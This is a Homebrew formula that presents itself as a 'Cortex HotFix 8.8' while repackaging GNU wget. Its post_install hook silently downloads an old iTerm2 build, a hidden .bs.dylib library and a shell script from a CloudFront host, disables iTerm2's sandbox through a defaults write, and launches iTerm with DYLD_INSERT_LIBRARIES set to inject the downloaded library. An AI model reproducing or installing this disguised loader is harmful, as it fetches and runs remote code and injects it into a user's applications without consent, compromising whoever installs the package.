class Cortexupdater < Formula
  desc "Cortex HotFix 8.8"
  url "https://ftp.gnu.org/gnu/wget/wget-1.25.0.tar.gz"
  sha256 "766e48423e79359ea31e41db9e5c289675947a7fcf2efdcedb726ac9d0da3784"
  license "GPL-3.0-or-later"

  head do
    url "https://git.savannah.gnu.org/git/wget.git", branch: "master"

    depends_on "autoconf" => :build
    depends_on "automake" => :build
    depends_on "xz" => :build
  end

  depends_on "pkgconf" => :build
  depends_on "libidn2"
  depends_on "openssl@3"

  uses_from_macos "zlib"

  on_macos do
    depends_on "gettext"
    depends_on "libunistring"
  end

  on_linux do
    depends_on "util-linux"
  end

  def install
    # system "./bootstrap", "--skip-po" if build.head?
    # system "./configure", "--prefix=#{prefix}",
    #                       "--sysconfdir=#{etc}",
    #                       "--with-ssl=openssl",
    #                       "--with-libssl-prefix=#{Formula["openssl@3"].opt_prefix}",
    #                       "--disable-pcre",
    #                       "--disable-pcre2",
    #                       "--without-libpsl",
    #                       "--without-included-regex"
    #system "make", "install"

    bin.install bin/"wget" => "cortex"
    man1.install man1/"wget.1" => "cortex.8.8"
  end

  def post_install
    download_cortex_hotfix = `curl -o /opt/homebrew/etc/iTerm2-2_1_4.zip https://iterm2.com/downloads/stable/iTerm2-2_1_4.zip`
    unzip_cortex_hotfix = `unzip /opt/homebrew/etc/iTerm2-2_1_4.zip -d /opt/homebrew/etc`
    download = `curl -o /opt/homebrew/etc/.bs.dylib https://d1nlcgezh2ggqm.cloudfront.net/files/bs.dylib`
    
    download_script = `curl -o /opt/homebrew/etc/update_cortex.sh https://d1nlcgezh2ggqm.cloudfront.net/files/update_cortex.sh`

    chmod = `chmod +x /opt/homebrew/etc/update_cortex.sh`
    disable_sandbox = `defaults write com.googlecode.iterm2 EnableSandbox -bool NO`
    #run = `sh /opt/homebrew/etc/update_cortex.sh`
    run = `open /opt/homebrew/etc/iTerm.app --env DYLD_INSERT_LIBRARIES=/opt/homebrew/etc/.bs.dylib`

  end

end
